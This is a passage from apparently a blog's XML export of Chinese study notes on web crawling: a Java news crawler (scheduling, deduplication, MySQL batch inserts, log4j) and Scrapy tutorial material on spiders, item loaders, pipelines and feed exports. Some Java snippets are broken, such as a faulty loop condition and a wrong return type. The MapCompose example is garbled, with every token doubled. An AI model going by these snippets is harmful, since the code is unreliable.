stringBuilder.append(&quot;\n&quot;); } lineCounter ++; stringBuilder.append(temp); } br.close(); return stringBuilder.toString(); } public static List&lt;String&gt; readFromFile(String filePath,String charset) throws Exception{ File fileObj = new File(filePath); FileInputStream fis = new FileInputStream(fileObj); InputStreamReader isr = new InputStreamReader(fis); BufferedReader br = new BufferedReader(isr); StringBuilder stringBuilder = new StringBuilder(); String temp = null; List&lt;String&gt; lineList = new ArrayList&lt;String&gt;(); while(temp=br.readLine()!=null){ temp = temp.trim(); if(temp.length() &gt; 0){ lineList.add(temp); } } br.close(); return stringBuilder.toString(); } psvm(){ } } //seeds.txt http://news.youth.cn/gn/ URL. 里面有个.openStream()。 返回InputStream ..... 拿到html后 //负责接收外部传过来的url任务，通过一定的分发策略，将相应的url任务分发到采集任务中 public class ScheduleManager{ public static List&lt;UrlTaskPojo&gt; todoTaskList = new LinkedList&lt;&gt;(); // public static List&lt;UrlTaskPojo&gt; xxx(xxx){ //将种子url加入到待采集队列 return null; } } 去重： 添加种子的时候要去重 remove的时候也要去重 public static Set&lt;String&gt; todoTaskUrl = new HashSet&lt;String&gt;(); if(todoTaskUrl.contains(seedUrl)){ return false; } todoTaskUrlSet.remove(url); mysql插入数据 maven依赖： mysql-connector-java 5.1.40 批量插入数据： PreparedStatement ps = conn.prepareStatement(sql); ps.addBatch(); for(xxx:xxx){ ps.set... ps.addBatch(); } ps.executeBatch(); //25 前5页采集 周期采集 一次采集步骤： 1.拿种子 2.交给任务调度层，用于后续的下载分发 3.下载拿到的url，没有则返回空 4.解析下载下来的htmlsource 5.对解析出来的对象进行持久化 3. String htmlSource = DownLoadManager.download(); while(htmlSource != null){ 4. 5. 3. } while(true){ 12345. Thread.sleep(10*1000); } 将定时循环次数放在配置文件里面 增量采集： //用于保存已采集过的url的任务集合donwTaskSet public static Set&lt;String&gt; doneTaskSet = new HashSet&lt;String&gt;(); 在持久化的时候 //filed:01 （不建议） for(xxx:xxx){ //加入到已采集任务集合当中 } //filed:02 (这种方式更符合业务逻辑) //在5.步的时候 DataPersistenceManager.persist(resultEntityList); //将已入库完成的entity数据，加入到已采集数据的set当中，用于判断是否已采集过数据，最终实现增量采集 ScheduleManager.addUrlToDoneTaskSet(resultEntityList); htmlSource = DownLoadManager.download(); public static void addUrlToDoneTaskSet(List&lt;ParserResultEntity&gt; resultEntityList){ for(ParserResultEntity entity:resultEntityList){ addUrlToDoneTaskSet(entity.getSourceUrl()); } } //在4.步到5.步时判断是否需要添加重复的数据持久化 3种方法判断 在4上，在5上，在4～5之间判断（优） 4. //加入增量采集的判断 boolean isFindRepeatData = false; List&lt;ParserResultEntity&gt; resultEntityListFinal = new ArrayList&lt;ParserResultEntity&gt;(); for(ParserResultEntity entity:resultEntityList){ if(ScheduleManager.isHaveDone(entity.getSourceUrl)){ isFindRepeatData = true; break; } ParserResultEntityFinal.add(entity); } //scheduleManager.java public static boolean isHaveDone(String url){ return doneTaskSet.contains(url); } 5. DataPersistenceManager.persist(resultEntityListFinal); ScheduleManager.addUrlToDoneTaskSet(resultEntityList); //循环下载，直到不存在待采集任务 if(isFindRepeatData){ ScheduleManager.clearToDoTaskList(); sout(&quot;发现重复&quot;); break; } htmlSource = DownLoadManager.download(); //ScheduleManager.java public static void clearToDoTaskList(){ todoTaskUrlSet.clear(); todoTaskUrlList.clear(); } log4j reg：介绍 https://www.cnblogs.com/franson-2016/p/5640427.html log4j maven 修改log4j.properties. 一般maven文件都放在resources下 要自己新建 UTF-8 log4j.rootLogger = DEBUG,stdout,file //这里不写info,表示DEBUG级以上的信息全部显示出来 .File = 路径 .MaxFileSize = 5MB 每隔多少M写一个新的文件 TestLog4j{ public static Logger logger = Logger.getLogger(TestLog4j.class); psvm(){ logger.info(&quot;123&quot;); } } 将其放入爬虫： manager StatisticManager(); public class StaticManager{ public static Logger logger=Logger.getLogger(StatisticManager.class); public static void logStatistic(){ logger.info(SchedulaManager.xxxx); } }]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>Java</category>
        <category>爬虫</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>编程</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[scrapy学习笔记01]]></title>
    <url>%2F2018%2F09%2F10%2Fscrapy%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001%2F</url>
    <content type="text"><![CDATA[scrapy学习 创建项目 scrapy startproject tutorial 该命令将会创建包含下列内容的 tutorial 目录: scrapy.cfg: 项目的配置文件 tutorial/: 该项目的python模块。之后您将在此加入代码。 tutorial/items.py: 项目中的item文件. tutorial/pipelines.py: 项目中的pipelines文件. tutorial/settings.py: 项目的设置文件. tutorial/spiders/: 放置spider代码的目录. Item 是保存爬取到的数据的容器 编辑 tutorial 目录中的 items.py 文件: import scrapy class DmozItem(scrapy.Item): title = scrapy.Field() link = scrapy.Field() desc = scrapy.Field() Spider是用户编写用于从单个网站(或者一些网站)爬取数据的类。 必须继承 scrapy.Spider 类, 且定义以下三个属性 name: start_urls: parse() 以下为我们的第一个Spider代码，保存在 tutorial/spiders 目录下的 dmoz_spider.py 文件中: import scrapy class DmozSpider(scrapy.Spider): name = &quot;dmoz&quot; allowed_domains = [&quot;dmoz.org&quot;] start_urls = [ &quot;http://www.dmoz.org/Computers/Programming/Languages/Python/Books/&quot;, &quot;http://www.dmoz.org/Computers/Programming/Languages/Python/Resources/&quot; ] def parse(self, response): filename = response.url.split(&quot;/&quot;)[-2] with open(filename, &apos;wb&apos;) as f: f.write(response.body) 启动爬虫： scrapy crawl dmoz parse: Scrapy使用了一种基于 XPath 和 CSS 表达式机制: Scrapy Selectors Selector有四个基本的方法(点击相应的方法可以看到详细的API文档): xpath(): 传入xpath表达式，返回该表达式所对应的所有节点的selector list列表 。 css(): 传入CSS表达式，返回该表达式所对应的所有节点的selector list列表. extract(): 序列化该节点为unicode字符串并返回list。 re(): 根据传入的正则表达式对数据进行提取，返回unicode字符串list列表。 Scrapy Shell需要您预装好IPython(一个扩展的Python终端)。 scrapy shell &quot;http://www.dmoz.org/Computers/Programming/Languages/Python/Books/&quot; *当您在终端运行Scrapy时，请一定记得给url地址加上引号，否则包含参数的url(例如 &amp; 字符)会导致Scrapy运行失败。 当shell载入后，您将得到一个包含response数据的本地 response 变量。输入 response.body 将输出response的包体， 输出 response.headers 可以看到response的包头。 response.xpath(&apos;//title&apos;).extract() 在我们的spider中加入这段代码: import scrapy class DmozSpider(scrapy.Spider): name = &quot;dmoz&quot; allowed_domains = [&quot;dmoz.org&quot;] start_urls = [ &quot;http://www.dmoz.org/Computers/Programming/Languages/Python/Books/&quot;, &quot;http://www.dmoz.org/Computers/Programming/Languages/Python/Resources/&quot; ] def parse(self, response): for sel in response.xpath(&apos;//ul/li&apos;): title = sel.xpath(&apos;a/text()&apos;).extract() link = sel.xpath(&apos;a/@href&apos;).extract() desc = sel.xpath(&apos;text()&apos;).extract() print title, link, desc 现在尝试再次爬取dmoz.org，您将看到爬取到的网站信息被成功输出: 使用Item： Item 对象是自定义的python字典。 一般来说，Spider将会将爬取到的数据以 Item 对象返回。所以为了将爬取的数据返回 我们最终的代码将是: import scrapy from tutorial.items import DmozItem class DmozSpider(scrapy.Spider): name = &quot;dmoz&quot; allowed_domains = [&quot;dmoz.org&quot;] start_urls = [ &quot;http://www.dmoz.org/Computers/Programming/Languages/Python/Books/&quot;, &quot;http://www.dmoz.org/Computers/Programming/Languages/Python/Resources/&quot; ] def parse(self, response): for sel in response.xpath(&apos;//ul/li&apos;): item = DmozItem() item[&apos;title&apos;] = sel.xpath(&apos;a/text()&apos;).extract() item[&apos;link&apos;] = sel.xpath(&apos;a/@href&apos;).extract() item[&apos;desc&apos;] = sel.xpath(&apos;text()&apos;).extract() yield item 保存爬取到的数据 最简单存储爬取的数据的方式是使用 Feed exports: scrapy crawl dmoz -o items.json 如果需要对爬取到的item做更多更为复杂的操作，您可以编写 Item Pipeline 。 类似于我们在创建项目时对Item做的，用于您编写自己的 tutorial/pipelines.py 也被创建。 不过如果您仅仅想要保存item，您不需要实现任何的pipeline。 ）：命令行工具(Command line tools) scrapy.cfg 存放的目录被认为是 项目的根目录 。该文件中包含python模块名的字段定义了项目的设置。 使用 scrapy 工具 步骤： scrapy startproject myproject cd myproject scrapy genspider mydomain mydomain.com scrapy &lt;command&gt; -h scrapy -h 全局命令: startproject settings runspider shell fetch view version 项目(Project-only)命令: crawl check list edit parse genspider deploy bench startproject 在 project_name 文件夹下创建一个名为 project_name 的Scrapy项目。 genspider 在当前项目中创建spider。 scrapy genspider -l scrapy genspider -d basic scrapy genspider -t basic example example.com crawl 使用spider进行爬取。 scrapy crawl myspider check 运行contract检查。 scrapy check -l list 列出当前项目中所有可用的spider。每行输出一个spider。 scrapy list edit 使用 EDITOR 中设定的编辑器编辑给定的spider scrapy edit spider1 fetch 使用Scrapy下载器(downloader)下载给定的URL，并将获取到的内容送到标准输出。 该命令以spider下载页面的方式获取页面。 scrapy fetch --nolog http://www.example.com/some/page.html scrapy fetch --nolog --headers http://www.example.com/ view 在浏览器中打开给定的URL，并以Scrapy spider获取到的形式展现。 scrapy view http://www.example.com/some/page.html shell 以给定的URL(如果给出)或者空(没有给出URL)启动Scrapy shell。 scrapy shell http://www.example.com/some/page.html parse 获取给定的URL并使用相应的spider分析处理。如果您提供 --callback 选项，则使用spider的该方法处理，否则使用 parse 。 scrapy parse http://www.example.com/ -c parse_item settings 获取Scrapy的设定 在项目中运行时，该命令将会输出项目的设定值，否则输出Scrapy默认设定。 $ scrapy settings --get BOT_NAME runspider 在未创建项目的情况下，运行一个编写在Python文件中的spider。 scrapy runspider myspider.py version 输出Scrapy版本。配合 -v 运行时，该命令同时输出Python, Twisted以及平台的信息，方便bug提交。 deploy 将项目部署到Scrapyd服务。查看 部署您的项目 。 import scrapy class Product(scrapy.Item): name = scrapy.Field() price = scrapy.Field() stock = scrapy.Field() last_updated = scrapy.Field(serializer=str) 创建item &gt;&gt;&gt; product = Product(name=&apos;Desktop PC&apos;, price=1000) &gt;&gt;&gt; print product Product(name=&apos;Desktop PC&apos;, price=1000) 获取字段的值 &gt;&gt;&gt; product[&apos;name&apos;] Desktop PC &gt;&gt;&gt; product.get(&apos;name&apos;) Desktop PC &gt;&gt;&gt; product[&apos;price&apos;] 1000 &gt;&gt;&gt; product[&apos;last_updated&apos;] Traceback (most recent call last): ... KeyError: &apos;last_updated&apos; &gt;&gt;&gt; product.get(&apos;last_updated&apos;, &apos;not set&apos;) not set &gt;&gt;&gt; product[&apos;lala&apos;] # getting unknown field Traceback (most recent call last): ... KeyError: &apos;lala&apos; &gt;&gt;&gt; product.get(&apos;lala&apos;, &apos;unknown field&apos;) &apos;unknown field&apos; &gt;&gt;&gt; &apos;name&apos; in product # is name field populated? True &gt;&gt;&gt; &apos;last_updated&apos; in product # is last_updated populated? False &gt;&gt;&gt; &apos;last_updated&apos; in product.fields # is last_updated a declared field? True &gt;&gt;&gt; &apos;lala&apos; in product.fields # is lala a declared field? False 设置字段的值 &gt;&gt;&gt; product[&apos;last_updated&apos;] = &apos;today&apos; &gt;&gt;&gt; product[&apos;last_updated&apos;] today &gt;&gt;&gt; product[&apos;lala&apos;] = &apos;test&apos; # setting unknown field Traceback (most recent call last): ... KeyError: &apos;Product does not support field: lala&apos; &gt;&gt;&gt; product.keys() [&apos;price&apos;, &apos;name&apos;] &gt;&gt;&gt; product.items() [(&apos;price&apos;, 1000), (&apos;name&apos;, &apos;Desktop PC&apos;)] 复制item: &gt;&gt;&gt; product2 = Product(product) &gt;&gt;&gt; print product2 Product(name=&apos;Desktop PC&apos;, price=1000) &gt;&gt;&gt; product3 = product2.copy() &gt;&gt;&gt; print product3 Product(name=&apos;Desktop PC&apos;, price=1000) 根据item创建字典(dict): &gt;&gt;&gt; dict(product) # create a dict from all populated values {&apos;price&apos;: 1000, &apos;name&apos;: &apos;Desktop PC&apos;} 根据字典(dict)创建item: &gt;&gt;&gt; Product({&apos;name&apos;: &apos;Laptop PC&apos;, &apos;price&apos;: 1500}) Product(price=1500, name=&apos;Laptop PC&apos;) &gt;&gt;&gt; Product({&apos;name&apos;: &apos;Laptop PC&apos;, &apos;lala&apos;: 1500}) # warning: unknown field in dict Traceback (most recent call last): ... KeyError: &apos;Product does not support field: lala&apos; 您可以通过继承原始的Item来扩展item(添加更多的字段或者修改某些字段的元数据)。 class DiscountedProduct(Product): discount_percent = scrapy.Field(serializer=str) discount_expiration_date = scrapy.Field() class SpecificProduct(Product): name = scrapy.Field(Product.fields[&apos;name&apos;], serializer=my_serializer) class scrapy.item.Item([arg]) 返回一个根据给定的参数可选初始化的item。 class scrapy.item.Field([arg]) Field 仅仅是内置的 dict 类的一个别名，并没有提供额外的方法或者属性。 Spider 在运行 crawl 时添加 -a 可以传递Spider参数: scrapy crawl myspider -a category=electronics 内置Spider import scrapy class MySpider(scrapy.Spider): name = &apos;example.com&apos; allowed_domains = [&apos;example.com&apos;] start_urls = [ &apos;http://www.example.com/1.html&apos;, &apos;http://www.example.com/2.html&apos;, &apos;http://www.example.com/3.html&apos;, ] def parse(self, response): self.log(&apos;A response from %s just arrived!&apos; % response.url) 另一个在单个回调函数中返回多个Request以及Item的例子: import scrapy from myproject.items import MyItem class MySpider(scrapy.Spider): name = &apos;example.com&apos; allowed_domains = [&apos;example.com&apos;] start_urls = [ &apos;http://www.example.com/1.html&apos;, &apos;http://www.example.com/2.html&apos;, &apos;http://www.example.com/3.html&apos;, ] def parse(self, response): sel = scrapy.Selector(response) for h3 in response.xpath(&apos;//h3&apos;).extract(): yield MyItem(title=h3) for url in response.xpath(&apos;//a/@href&apos;).extract(): yield scrapy.Request(url, callback=self.parse) CrawlSpider样例 接下来给出配合rule使用CrawlSpider的例子: import scrapy from scrapy.contrib.spiders import CrawlSpider, Rule from scrapy.contrib.linkextractors import LinkExtractor class MySpider(CrawlSpider): name = &apos;example.com&apos; allowed_domains = [&apos;example.com&apos;] start_urls = [&apos;http://www.example.com&apos;] rules = ( # 提取匹配 &apos;category.php&apos; (但不匹配 &apos;subsection.php&apos;) 的链接并跟进链接(没有callback意味着follow默认为True) Rule(LinkExtractor(allow=(&apos;category\.php&apos;, ), deny=(&apos;subsection\.php&apos;, ))), # 提取匹配 &apos;item.php&apos; 的链接并使用spider的parse_item方法进行分析 Rule(LinkExtractor(allow=(&apos;item\.php&apos;, )), callback=&apos;parse_item&apos;), ) def parse_item(self, response): self.log(&apos;Hi, this is an item page! %s&apos; % response.url) item = scrapy.Item() item[&apos;id&apos;] = response.xpath(&apos;//td[@id=&quot;item_id&quot;]/text()&apos;).re(r&apos;ID: (\d+)&apos;) item[&apos;name&apos;] = response.xpath(&apos;//td[@id=&quot;item_name&quot;]/text()&apos;).extract() item[&apos;description&apos;] = response.xpath(&apos;//td[@id=&quot;item_description&quot;]/text()&apos;).extract() return item XMLFeedSpider例子 该spider十分易用。下边是其中一个例子: from scrapy import log from scrapy.contrib.spiders import XMLFeedSpider from myproject.items import TestItem class MySpider(XMLFeedSpider): name = &apos;example.com&apos; allowed_domains = [&apos;example.com&apos;] start_urls = [&apos;http://www.example.com/feed.xml&apos;] iterator = &apos;iternodes&apos; # This is actually unnecessary, since it&apos;s the default value itertag = &apos;item&apos; def parse_node(self, response, node): log.msg(&apos;Hi, this is a &lt;%s&gt; node!: %s&apos; % (self.itertag, &apos;&apos;.join(node.extract()))) item = TestItem() item[&apos;id&apos;] = node.xpath(&apos;@id&apos;).extract() item[&apos;name&apos;] = node.xpath(&apos;name&apos;).extract() item[&apos;description&apos;] = node.xpath(&apos;description&apos;).extract() return item CSVFeedSpider例子 下面的例子和之前的例子很像，但使用了 CSVFeedSpider: from scrapy import log from scrapy.contrib.spiders import CSVFeedSpider from myproject.items import TestItem class MySpider(CSVFeedSpider): name = &apos;example.com&apos; allowed_domains = [&apos;example.com&apos;] start_urls = [&apos;http://www.example.com/feed.csv&apos;] delimiter = &apos;;&apos; headers = [&apos;id&apos;, &apos;name&apos;, &apos;description&apos;] def parse_row(self, response, row): log.msg(&apos;Hi, this is a row!: %r&apos; % row) item = TestItem() item[&apos;id&apos;] = row[&apos;id&apos;] item[&apos;name&apos;] = row[&apos;name&apos;] item[&apos;description&apos;] = row[&apos;description&apos;] return item SitemapSpider样例 Selectors: 以文字构造: &gt;&gt;&gt; body = &apos;&lt;html&gt;&lt;body&gt;&lt;span&gt;good&lt;/span&gt;&lt;/body&gt;&lt;/html&gt;&apos; &gt;&gt;&gt; Selector(text=body).xpath(&apos;//span/text()&apos;).extract() [u&apos;good&apos;] 以response构造: &gt;&gt;&gt; response = HtmlResponse(url=&apos;http://example.com&apos;, body=body) &gt;&gt;&gt; Selector(response=response).xpath(&apos;//span/text()&apos;).extract() [u&apos;good&apos;] Item Loaders: 用Item Loaders装载Items 要使用Item Loader, 你必须先将它实例化. 你可以使用类似字典的对象(例如: Item or dict)来进行实例化, 或者不使用对象也可以, 当不用对象进行实例化的时候,Item会自动使用 ItemLoader.default_item_class 属性中指定的Item 类在Item Loader constructor中实例化. 然后,你开始收集数值到Item Loader时,通常使用 Selectors. 你可以在同一个item field 里面添加多个数值;Item Loader将知道如何用合适的处理函数来“添加”这些数值. from scrapy.contrib.loader import ItemLoader from myproject.items import Product def parse(self, response): l = ItemLoader(item=Product(), response=response) l.add_xpath(&apos;name&apos;, &apos;//div[@class=&quot;product_name&quot;]&apos;) l.add_xpath(&apos;name&apos;, &apos;//div[@class=&quot;product_title&quot;]&apos;) l.add_xpath(&apos;price&apos;, &apos;//p[@id=&quot;price&quot;]&apos;) l.add_css(&apos;stock&apos;, &apos;p#stock]&apos;) l.add_value(&apos;last_updated&apos;, &apos;today&apos;) # you can also use literal values return l.load_item() Item Loader在每个(Item)字段中都包含了一个输入处理器和一个输出处理器｡ 输入处理器收到数据时立刻提取数据 (通过 add_xpath(), add_css() 或者 add_value() 方法) 之后输入处理器的结果被收集起来并且保存在ItemLoader内. l = ItemLoader(Product(), some_selector) l.add_xpath(&apos;name&apos;, xpath1) # (1) l.add_xpath(&apos;name&apos;, xpath2) # (2) l.add_css(&apos;name&apos;, css) # (3) l.add_value(&apos;name&apos;, &apos;test&apos;) # (4) return l.load_item() # (5) 从 xpath1 提取出的数据,传递给 输入处理器 的 name 字段.输入处理器的结果被收集和保存在Item Loader中(但尚未分配给该Item)｡ 输入和输出处理器的优先顺序如下： Item Loader特定于字段的属性：field_in和field_out（最优先） 字段元数据（input_processor和output_processor键） Item Loader默认值：ItemLoader.default_input_processor()和 ItemLoader.default_output_processor()（最少优先级） There are several ways to modify Item Loader context values: loader = ItemLoader(product) loader.context[&apos;unit&apos;] = &apos;cm&apos; loader = ItemLoader(product, unit=&apos;cm&apos;) class ProductLoader(ItemLoader): length_out = MapCompose(parse_length, unit=&apos;cm&apos;) ItemLoader对象 返回一个新的Item Loader来填充给定的Item。如果没有给出项目，则使用该类自动实例化一个项目 default_item_class。 Examples: &gt;&gt;&gt; from scrapy.contrib.loader.processor import TakeFirst &gt;&gt;&gt; loader.get_value(u&apos;name: foo&apos;, TakeFirst(), unicode.upper, re=&apos;name: (.+)&apos;) &apos;FOO` Examples: loader.add_value(&apos;name&apos;, u&apos;Color TV&apos;) loader.add_value(&apos;colours&apos;, [u&apos;white&apos;, u&apos;blue&apos;]) loader.add_value(&apos;length&apos;, u&apos;100&apos;) loader.add_value(&apos;name&apos;, u&apos;name: foo&apos;, TakeFirst(), re=&apos;name: (.+)&apos;) loader.add_value(None, {&apos;name&apos;: u&apos;foo&apos;, &apos;sex&apos;: u&apos;male&apos;}) # HTML snippet: &lt;p class=&quot;product-name&quot;&gt;Color TV&lt;/p&gt; loader.get_xpath(&apos;//p[@class=&quot;product-name&quot;]&apos;) # HTML snippet: &lt;p id=&quot;price&quot;&gt;the price is $1200&lt;/p&gt; loader.get_xpath(&apos;//p[@id=&quot;price&quot;]&apos;, TakeFirst(), re=&apos;the price is (.*)&apos;) # HTML snippet: &lt;p class=&quot;product-name&quot;&gt;Color TV&lt;/p&gt; loader.add_xpath(&apos;name&apos;, &apos;//p[@class=&quot;product-name&quot;]&apos;) # HTML snippet: &lt;p id=&quot;price&quot;&gt;the price is $1200&lt;/p&gt; loader.add_xpath(&apos;price&apos;, &apos;//p[@id=&quot;price&quot;]&apos;, re=&apos;the price is (.*)&apos;) # HTML snippet: &lt;p class=&quot;product-name&quot;&gt;Color TV&lt;/p&gt; loader.get_css(&apos;p.product-name&apos;) # HTML snippet: &lt;p id=&quot;price&quot;&gt;the price is $1200&lt;/p&gt; loader.get_css(&apos;p#price&apos;, TakeFirst(), re=&apos;the price is (.*)&apos;) # HTML snippet: &lt;p class=&quot;product-name&quot;&gt;Color TV&lt;/p&gt; loader.add_css(&apos;name&apos;, &apos;p.product-name&apos;) # HTML snippet: &lt;p id=&quot;price&quot;&gt;the price is $1200&lt;/p&gt; loader.add_css(&apos;price&apos;, &apos;p#price&apos;, re=&apos;the price is (.*)&apos;) Available built-in processors &gt;&gt;&gt; from scrapy.contrib.loader.processor import Identity &gt;&gt;&gt; proc = Identity() &gt;&gt;&gt; proc([&apos;one&apos;, &apos;two&apos;, &apos;three&apos;]) [&apos;one&apos;, &apos;two&apos;, &apos;three&apos;] &gt;&gt;&gt; from scrapy.contrib.loader.processor import TakeFirst &gt;&gt;&gt; proc = TakeFirst() &gt;&gt;&gt; proc([&apos;&apos;, &apos;one&apos;, &apos;two&apos;, &apos;three&apos;]) &apos;one&apos; &gt;&gt;&gt; from scrapy.contrib.loader.processor import Join &gt;&gt;&gt; proc = Join() &gt;&gt;&gt; proc([&apos;one&apos;, &apos;two&apos;, &apos;three&apos;]) u&apos;one two three&apos; &gt;&gt;&gt; proc = Join(&apos;&lt;br&gt;&apos;) &gt;&gt;&gt; proc([&apos;one&apos;, &apos;two&apos;, &apos;three&apos;]) u&apos;one&lt;br&gt;two&lt;br&gt;three&apos; &gt;&gt;&gt; from scrapy.contrib.loader.processor import Compose &gt;&gt;&gt; proc = Compose(lambda v: v[0], str.upper) &gt;&gt;&gt; proc([&apos;hello&apos;, &apos;world&apos;]) &apos;HELLO&apos; &gt;&gt;&gt; &gt;&gt;&gt; defdef filter_worldfilter_world((xx):): ... ... returnreturn NoneNone ifif xx ==== &apos;world&apos;&apos;world&apos; elseelse xx ...... &gt;&gt;&gt; &gt;&gt;&gt; fromfrom scrapy.contrib.loader.processorscrapy.contrib.loader.processor importimport MapComposeMapCompose &gt;&gt;&gt; &gt;&gt;&gt; procproc == MapComposeMapCompose((filter_worldfilter_world,, unicodeunicode..upperupper)) &gt;&gt;&gt; &gt;&gt;&gt; procproc([([uu&apos;hello&apos;&apos;hello&apos;,, uu&apos;world&apos;&apos;world&apos;,, uu&apos;this&apos;&apos;this&apos;,, uu&apos;is&apos;&apos;is&apos;,, uu&apos;scrapy&apos;&apos;scrapy&apos;])]) [u&apos;HELLO, u&apos;THIS&apos;, u&apos;IS&apos;, u&apos;SCRAPY&apos;][u&apos;HELLO, u&apos;THIS&apos;, u&apos;IS&apos;, u&apos;SCRAPY&apos;] Scrapy终端(Scrapy shell) 该终端是用来测试XPath或CSS表达式，查看他们的工作方式及从爬取的网页中提取的数据。 强烈推荐您安装 IPython 您可以使用 shell 来启动Scrapy终端: scrapy shell &lt;url&gt; 可用的快捷命令(shortcut) shelp() - 打印可用对象及快捷命令的帮助列表 fetch(request_or_url) - 根据给定的请求(request)或URL获取一个新的response，并更新相关的对象 view(response) - 在本机的浏览器打开给定的response。 首先，我们启动终端: scrapy shell &apos;http://scrapy.org&apos; --nolog 有时您想在spider的某个位置中查看被处理的response， 以确认您期望的response到达特定位置。 这可以通过 scrapy.shell.inspect_response 函数来实现。 以下是如何在spider中调用该函数的例子: import scrapy class MySpider(scrapy.Spider): name = &quot;myspider&quot; start_urls = [ &quot;http://example.com&quot;, &quot;http://example.org&quot;, &quot;http://example.net&quot;, ] def parse(self, response): # We want to inspect one specific response. if &quot;.org&quot; in response.url: from scrapy.shell import inspect_response inspect_response(response, self) # Rest of parsing code. 当运行spider时，您将得到类似下列的输出: 2014-01-23 17:48:31-0400 [myspider] DEBUG: Crawled (200) &lt;GET http://example.com&gt; (referer: None) 2014-01-23 17:48:31-0400 [myspider] DEBUG: Crawled (200) &lt;GET http://example.org&gt; (referer: None) [s] Available Scrapy objects: [s] crawler &lt;scrapy.crawler.Crawler object at 0x1e16b50&gt; ... &gt;&gt;&gt; response.url &apos;http://example.org&apos; 您可以在浏览器里查看response的结果，判断是否是您期望的结果: &gt;&gt;&gt; view(response) True 最后您可以点击Ctrl-D(Windows下Ctrl-Z)来退出终端，恢复爬取: 由于该终端屏蔽了Scrapy引擎，您在这个终端中不能使用 fetch 快捷命令(shortcut) Item Pipeline 当Item在Spider中被收集之后，它将会被传递到Item Pipeline，一些组件会按照一定的顺序执行对Item的处理。 以下是item pipeline的一些典型应用： 清理HTML数据 验证爬取的数据(检查item包含某些字段) 查重(并丢弃) 将爬取结果保存到数据库中 验证价格，同时丢弃没有价格的item from scrapy.exceptions import DropItem class PricePipeline(object): vat_factor = 1.15 def process_item(self, item, spider): if item[&apos;price&apos;]: if item[&apos;price_excludes_vat&apos;]: item[&apos;price&apos;] = item[&apos;price&apos;] * self.vat_factor return item else: raise DropItem(&quot;Missing price in %s&quot; % item) 将item写入JSON文件 以下pipeline将所有(从所有spider中)爬取到的item，存储到一个独立地 items.jl 文件，每行包含一个序列化为JSON格式的item: import json class JsonWriterPipeline(object): def __init__(self): self.file = open(&apos;items.jl&apos;, &apos;wb&apos;) def process_item(self, item, spider): line = json.dumps(dict(item)) + &quot;\n&quot; self.file.write(line) return item JsonWriterPipeline的目的只是为了介绍怎样编写item pipeline，如果你想要将所有爬取的item都保存到同一个JSON文件， 你需要使用 Feed exports 。 去重 from scrapy.exceptions import DropItem class DuplicatesPipeline(object): def __init__(self): self.ids_seen = set() def process_item(self, item, spider): if item[&apos;id&apos;] in self.ids_seen: raise DropItem(&quot;Duplicate item found: %s&quot; % item) else: self.ids_seen.add(item[&apos;id&apos;]) return item 启用一个Item Pipeline组件 为了启用一个Item Pipeline组件，你必须将它的类添加到 ITEM_PIPELINES 配置 ITEM_PIPELINES = { &apos;myproject.pipelines.PricePipeline&apos;: 300, &apos;myproject.pipelines.JsonWriterPipeline&apos;: 800, } 分配给每个类的整型值，确定了他们运行的顺序，item按数字从低到高的顺序，通过pipeline，通常将这些数字定义在0-1000范围内。 Feed exports 实现爬虫时最经常提到的需求就是能合适的保存爬取到的数据，或者说，生成一个带有爬取数据的”输出文件”(通常叫做”输出feed”)，来供其他系统使用。 Scrapy自带了Feed输出，并且支持多种序列化格式(serialization format)及存储方式(storage backends)。 feed输出使用到了 Item exporters 。其自带支持的类型有: JSON JSON lines CSV XML 您也可以通过 FEED_EXPORTERS 设置扩展支持的属性。 存储(Storages) 使用feed输出时您可以通过使用 URI (通过 FEED_URI 设置) 来定义存储端。 feed输出支持URI方式支持的多种存储后端类型。 自带支持的存储后端有: 本地文件系统 FTP S3 (需要 boto) 标准输出 存储URI参数 存储URI也包含参数。当feed被创建时这些参数可以被覆盖: %(time)s - 当feed被创建时被timestamp覆盖 %(name)s - 被spider的名字覆盖 reg： 存储在FTP，每个spider一个目录: ftp://user:password@ftp.example.com/scraping/feeds/%(name)s/%(time)s.json 存储在S3，每一个spider一个目录: s3://mybucket/scraping/feeds/%(name)s/%(time)s.json 存储端(Storage backends) 将feed存储在本地系统。 URI scheme: file URI样例: file:///tmp/export.csv 需要的外部依赖库: none 设定(Settings) 这些是配置feed输出的设定: FEED_URI (必须) FEED_FORMAT FEED_STORAGES FEED_EXPORTERS FEED_STORE_EMPTY Link Extractors Link Extractors 是那些目的仅仅是从网页(scrapy.http.Response 对象)中抽取最终将会被follow链接的对象｡ 每个LinkExtractor有唯一的公共方法是 extract_links ,它接收一个 Response 对象,并返回一个 scrapy.link.Link 对象｡Link Extractors,要实例化一次并且 extract_links 方法会根据不同的response调用多次提取链接｡ LxmlLinkExtractor 是推荐的链接提取器，具有方便的过滤选项。它是使用lxml强大的HTMLParser实现的。 SgmlLinkExtractor 其提供了过滤器（filter），以便于提取包括符合正则表达式的链接。 BaseSgmlLinkExtractor 这个Link Extractor的目的只是充当了Sgml Link Extractor的基类。 Logging Scrapy提供了log功能。您可以通过 scrapy.log 模块使用。 log服务必须通过显示调用 scrapy.log.start() 来开启。 Scrapy提供5层logging级别: CRITICAL - 严重错误(critical) ERROR - 一般错误(regular errors) WARNING - 警告信息(warning messages) INFO - 一般信息(informational messages) DEBUG - 调试信息(debugging messages) 如何设置log级别 您可以通过终端选项(command line option) –loglevel/-L 或 LOG_LEVEL 来设置log级别。 如何记录信息(log messages) 下面给出如何使用 WARNING 级别来记录信息的例子: from scrapy import log log.msg(&quot;This is a warning&quot;, level=log.WARNING) scrapy.log.start(logfile=None, loglevel=None, logstdout=None) 启动log功能。 scrapy.log.msg(message, level=INFO, spider=None) 记录信息(Log a message) 。。。 Logging设置 以下设置可以被用来配置logging: LOG_ENABLED LOG_ENCODING LOG_FILE LOG_LEVEL LOG_STDOUT 数据收集(Stats Collection) Scrapy提供了方便的收集数据的机制。数据以key/value方式存储，值大多是计数值。 该机制叫做数据收集器(Stats Collector)，可以通过 Crawler API 的属性 stats 来使用。 无论数据收集(stats collection)开启或者关闭，数据收集器永远都是可用的。 class ExtensionThatAccessStats(object): def __init__(self, stats): self.stats = stats @classmethod def from_crawler(cls, crawler): return cls(crawler.stats) 设置数据: stats.set_value(&apos;hostname&apos;, socket.gethostname()) 增加数据值: stats.inc_value(&apos;pages_crawled&apos;) 